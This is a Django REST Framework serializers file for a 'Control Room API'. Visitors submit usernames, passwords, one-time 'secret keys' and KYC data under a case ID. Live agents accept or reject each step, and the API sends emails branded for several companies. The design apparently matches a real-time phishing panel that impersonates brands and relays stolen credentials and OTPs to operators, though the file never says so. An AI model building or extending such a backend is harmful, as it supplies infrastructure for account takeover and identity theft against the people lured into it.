# accounts/api/serializers.py
"""
DRF Serializers for Control Room API

Handles validation and serialization of:
- Session data (CRUD operations)
- User flow submissions (credentials, secrets, KYC)
- Agent actions (accept, reject)
- Global controls (reset, terminate, etc.)
"""

from rest_framework import serializers
from accounts.models import Session, SessionLog, EmailTemplate, Company
from django.contrib.auth.models import User


# ==========================
# COMPANY SERIALIZERS
# ==========================

class CompanyListSerializer(serializers.ModelSerializer):
    """Lightweight company list for dropdown/selection"""
    template_count = serializers.SerializerMethodField()

    class Meta:
        model = Company
        fields = [
            'id',
            'name',
            'slug',
            'logo_url',
            'primary_color',
            'secondary_color',
            'website_url',
            'template_count',
        ]
        read_only_fields = ['id', 'slug']

    def get_template_count(self, obj):
        """Count active email templates for this company"""
        return obj.email_templates.filter(is_active=True).count()


class CompanyDetailSerializer(serializers.ModelSerializer):
    """Full company details including email configuration"""
    template_count = serializers.SerializerMethodField()
    template_types = serializers.SerializerMethodField()

    class Meta:
        model = Company
        fields = [
            'id',
            'name',
            'slug',
            'logo_url',
            'primary_color',
            'secondary_color',
            'website_url',
            'from_email',
            'from_name',
            'reply_to_email',
            'support_email',
            'template_count',
            'template_types',
        ]
        read_only_fields = [
            'id',
            'slug',
            'from_email',
            'from_name',
            'reply_to_email',
            'support_email',
        ]

    def get_template_count(self, obj):
        """Count active email templates for this company"""
        return obj.email_templates.filter(is_active=True).count()

    def get_template_types(self, obj):
        """Get available template types for this company"""
        from accounts.models import EmailTemplate
        types = obj.email_templates.filter(is_active=True).values_list(
            'template_type', flat=True
        ).distinct()

        # Map to display names
        choice_dict = {code: display for code, display in EmailTemplate.TEMPLATE_TYPE_CHOICES}
        return [
            {'code': t, 'display': choice_dict.get(t, t)}
            for t in types
        ]


# ==========================
# SESSION SERIALIZERS
# ==========================

class SessionSerializer(serializers.ModelSerializer):
    """Full Session serializer with all fields"""
    agent_username = serializers.CharField(source='agent.username', read_only=True)

    class Meta:
        model = Session
        fields = [
            'uuid',
            'external_case_id',
            'agent',
            'agent_username',
            'stage',
            'status',
            'user_online',
            'notes',
            'user_data',
            'created_at',
            'updated_at',
        ]
        read_only_fields = ['uuid', 'created_at', 'updated_at', 'agent_username']


class SessionListSerializer(serializers.ModelSerializer):
    """Lightweight Session serializer for list views"""
    agent_username = serializers.CharField(source='agent.username', read_only=True)

    class Meta:
        model = Session
        fields = [
            'uuid',
            'external_case_id',
            'agent',
            'agent_username',
            'stage',
            'status',
            'user_online',
            'created_at',
            'updated_at',
        ]
        read_only_fields = ['uuid', 'created_at', 'updated_at', 'agent_username']


class SessionCreateSerializer(serializers.ModelSerializer):
    """Serializer for creating new sessions"""

    class Meta:
        model = Session
        fields = ['external_case_id']

    def validate_external_case_id(self, value):
        """Ensure external_case_id is unique if provided"""
        if value and Session.objects.filter(external_case_id=value).exists():
            raise serializers.ValidationError("Case ID already exists")
        return value

    def create(self, validated_data):
        """Create session with current user as agent"""
        from accounts.services.case_id_service import CaseIDService

        external_case_id = validated_data.get('external_case_id')
        if not external_case_id:
            external_case_id = CaseIDService.generate_unique_case_id()

        session = Session.objects.create(
            external_case_id=external_case_id,
            agent=self.context['request'].user,
            stage='case_id',
            status='active',
            user_online=False
        )

        SessionLog.objects.create(
            session=session,
            message=f'Session started by agent {self.context["request"].user.username}',
            log_type='agent_action'
        )

        return session


class SessionUpdateSerializer(serializers.ModelSerializer):
    """Serializer for updating sessions (notes, etc.)"""

    class Meta:
        model = Session
        fields = ['notes', 'stage', 'status']


# ==========================
# USER FLOW SERIALIZERS
# ==========================

class VerifyCaseIDSerializer(serializers.Serializer):
    """Validate case ID from user"""
    case_id = serializers.CharField(max_length=64, required=True)

    def validate_case_id(self, value):
        """Ensure case ID exists and is active"""
        if not Session.objects.filter(external_case_id=value, status='active').exists():
            raise serializers.ValidationError("Invalid or inactive case ID")
        return value


class SubmitCredentialsSerializer(serializers.Serializer):
    """Validate user credentials submission"""
    case_id = serializers.CharField(max_length=64, required=True)
    username = serializers.CharField(max_length=255, required=True)
    password = serializers.CharField(max_length=255, required=True)

    def validate_case_id(self, value):
        """Ensure case ID exists and is in credentials stage"""
        try:
            session = Session.objects.get(external_case_id=value, status='active')
            if session.stage != 'credentials':
                raise serializers.ValidationError(
                    f"Session is in '{session.stage}' stage, not 'credentials'"
                )
        except Session.DoesNotExist:
            raise serializers.ValidationError("Invalid or inactive case ID")
        return value


class SubmitSecretKeySerializer(serializers.Serializer):
    """Validate user secret key submission"""
    case_id = serializers.CharField(max_length=64, required=True)
    secret_key = serializers.CharField(max_length=255, required=True)

    def validate_case_id(self, value):
        """Ensure case ID exists and is in secret_key stage"""
        try:
            session = Session.objects.get(external_case_id=value, status='active')
            if session.stage != 'secret_key':
                raise serializers.ValidationError(
                    f"Session is in '{session.stage}' stage, not 'secret_key'"
                )
        except Session.DoesNotExist:
            raise serializers.ValidationError("Invalid or inactive case ID")
        return value


class UserStartedKYCSerializer(serializers.Serializer):
    """Validate when user begins KYC"""
    case_id = serializers.CharField(max_length=64, required=True)

    def validate_case_id(self, value):
        """Ensure case ID exists and is in kyc stage"""
        try:
            session = Session.objects.get(external_case_id=value, status='active')
            if session.stage != 'kyc':
                raise serializers.ValidationError(
                    f"Session is in '{session.stage}' stage, not 'kyc'"
                )
        except Session.DoesNotExist:
            raise serializers.ValidationError("Invalid or inactive case ID")
        return value


class SubmitKYCSerializer(serializers.Serializer):
    """Validate user KYC submission"""
    case_id = serializers.CharField(max_length=64, required=True)

    def validate_case_id(self, value):
        """Ensure case ID exists and is in kyc stage"""
        try:
            session = Session.objects.get(external_case_id=value, status='active')
            if session.stage != 'kyc':
                raise serializers.ValidationError(
                    f"Session is in '{session.stage}' stage, not 'kyc'"
                )
        except Session.DoesNotExist:
            raise serializers.ValidationError("Invalid or inactive case ID")
        return value


# ==========================
# AGENT ACTION SERIALIZERS
# ==========================

class AcceptLoginSerializer(serializers.Serializer):
    """Validate agent accepting login credentials"""
    # No additional data needed beyond session UUID
    pass


class RejectLoginSerializer(serializers.Serializer):
    """Validate agent rejecting login credentials"""
    reason = serializers.CharField(max_length=255, required=False, allow_blank=True)


class AcceptOTPSerializer(serializers.Serializer):
    """Validate agent accepting secret key"""
    pass


class RejectOTPSerializer(serializers.Serializer):
    """Validate agent rejecting secret key"""
    reason = serializers.CharField(max_length=255, required=False, allow_blank=True)


class AcceptKYCSerializer(serializers.Serializer):
    """Validate agent accepting KYC"""
    pass


class RejectKYCSerializer(serializers.Serializer):
    """Validate agent rejecting KYC"""
    reason = serializers.CharField(max_length=255, required=False, allow_blank=True)


# ==========================
# CONTROL SERIALIZERS
# ==========================

class NavigateSessionSerializer(serializers.Serializer):
    """Validate session navigation request"""
    target_stage = serializers.ChoiceField(
        choices=['case_id', 'credentials', 'secret_key', 'kyc', 'completed'],
        required=True,
        help_text="Target stage to navigate session to"
    )
    clear_data = serializers.ChoiceField(
        choices=['submission', 'all', 'none'],
        required=False,
        default='submission',
        help_text="Data clearing mode: submission (clear current only), all (clear everything), none (keep all)"
    )
    reason = serializers.CharField(
        max_length=500,
        required=False,
        allow_blank=True,
        help_text="Optional reason for navigation (audit trail)"
    )


class MarkUnsuccessfulSerializer(serializers.Serializer):
    """Validate mark unsuccessful request"""
    reason = serializers.CharField(
        max_length=500,
        required=False,
        allow_blank=True,
        help_text="Reason why verification was unsuccessful"
    )
    comment = serializers.CharField(
        max_length=1000,
        required=False,
        allow_blank=True,
        help_text="Additional context or notes"
    )


class ForceCompleteSerializer(serializers.Serializer):
    """Validate force complete request"""
    reason = serializers.CharField(
        max_length=500,
        required=False,
        allow_blank=True,
        help_text="Reason for force completing verification"
    )
    comment = serializers.CharField(
        max_length=1000,
        required=False,
        allow_blank=True,
        help_text="Additional context or notes"
    )


# ==========================
# UTILITY SERIALIZERS
# ==========================

class GenerateCaseIDSerializer(serializers.Serializer):
    """Validate case ID generation request"""
    # No input needed - just generates a new case ID
    pass


class SaveNotesSerializer(serializers.Serializer):
    """Validate saving session notes"""
    notes = serializers.CharField(max_length=5000, required=False, allow_blank=True)


# ==========================
# SESSION LOG SERIALIZERS
# ==========================

class SessionLogSerializer(serializers.ModelSerializer):
    """Serializer for session logs"""

    class Meta:
        model = SessionLog
        fields = ['id', 'message', 'log_type', 'extra_data', 'created_at']
        read_only_fields = ['id', 'created_at']


# ==========================
# BULK OPERATIONS SERIALIZERS
# ==========================

class BulkDeleteSerializer(serializers.Serializer):
    """Validate bulk delete operation"""
    uuids = serializers.ListField(
        child=serializers.UUIDField(),
        required=True,
        allow_empty=False
    )

    def validate_uuids(self, value):
        """Ensure at least one UUID and no duplicates"""
        if not value:
            raise serializers.ValidationError("uuids list cannot be empty")
        if len(value) != len(set(value)):
            raise serializers.ValidationError("Duplicate UUIDs in list")
        return value


# ==========================
# EMAIL SERIALIZERS
# ==========================

class SendEmailSerializer(serializers.Serializer):
    """
    Validate email send request from agent.

    Example request body:
    {
        "company_id": 1,
        "template_id": 5,
        "to_email": "john@example.com",
        "customer_name": "John Doe",
        "template_variables": {
            "verification_link": "https://app.com/verify/abc123"
        },
        "variables_override": {
            "verification_link": "https://custom.com"  # Optional override
        }
    }
    """

    company_id = serializers.IntegerField(
        help_text="Company ID to use for email configuration and branding"
    )

    template_id = serializers.IntegerField(
        help_text="EmailTemplate ID to use for rendering"
    )

    to_email = serializers.EmailField(
        help_text="Customer email address to send to"
    )

    customer_name = serializers.CharField(
        max_length=255,
        required=False,
        allow_blank=True,
        help_text="Customer name for email salutation (optional)"
    )

    template_variables = serializers.JSONField(
        help_text="Dict of variables to use in template. Common: customer_name, case_id, verification_link, stage, company_name, message"
    )

    variables_override = serializers.JSONField(
        required=False,
        allow_null=True,
        help_text="Optional: override any template variables (for agent customization)"
    )


class EmailLogSerializer(serializers.Serializer):
    """Serializer for displaying email history to agents"""

    from accounts.models import EmailLog

    id = serializers.IntegerField(read_only=True)
    to_email = serializers.EmailField(read_only=True)
    subject = serializers.CharField(read_only=True)
    status = serializers.CharField(read_only=True)
    template_type = serializers.SerializerMethodField(read_only=True)
    template_display = serializers.SerializerMethodField(read_only=True)
    created_at = serializers.DateTimeField(read_only=True)
    sent_at = serializers.DateTimeField(read_only=True, allow_null=True)
    error_message = serializers.CharField(read_only=True, allow_blank=True)
    sent_by_agent = serializers.SerializerMethodField(read_only=True)

    def get_template_type(self, obj):
        """Get template type from related template"""
        if obj.template:
            return obj.template.template_type
        return None

    def get_template_display(self, obj):
        """Get friendly display name of template type"""
        if obj.template:
            return obj.template.get_template_type_display()
        return None

    def get_sent_by_agent(self, obj):
        """Get agent username"""
        if obj.sent_by_agent:
            return obj.sent_by_agent.username
        return None


# ==========================
# EMAIL TEMPLATE SERIALIZERS
# ==========================

class EmailTemplateListSerializer(serializers.ModelSerializer):
    """Lightweight template list for frontend dropdown/selection"""
    template_type_display = serializers.CharField(source='get_template_type_display', read_only=True)

    class Meta:
        model = EmailTemplate
        fields = [
            'id',
            'name',
            'template_type',
            'template_type_display',
            'description',
            'is_active',
            'is_draft',
            'created_at',
            'updated_at',
        ]
        read_only_fields = ['id', 'created_at', 'updated_at']


class EmailTemplateDetailSerializer(serializers.ModelSerializer):
    """Full template details including HTML content for preview"""
    template_type_display = serializers.CharField(source='get_template_type_display', read_only=True)
    company_name = serializers.CharField(source='company.name', read_only=True)

    class Meta:
        model = EmailTemplate
        fields = [
            'id',
            'name',
            'template_type',
            'template_type_display',
            'description',
            'subject',
            'html_body',
            'plain_text_body',
            'available_variables',
            'is_active',
            'is_draft',
            'company_name',
            'created_at',
            'updated_at',
        ]
        read_only_fields = [
            'id',
            'subject',
            'html_body',
            'plain_text_body',
            'available_variables',
            'company_name',
            'created_at',
            'updated_at',
        ]
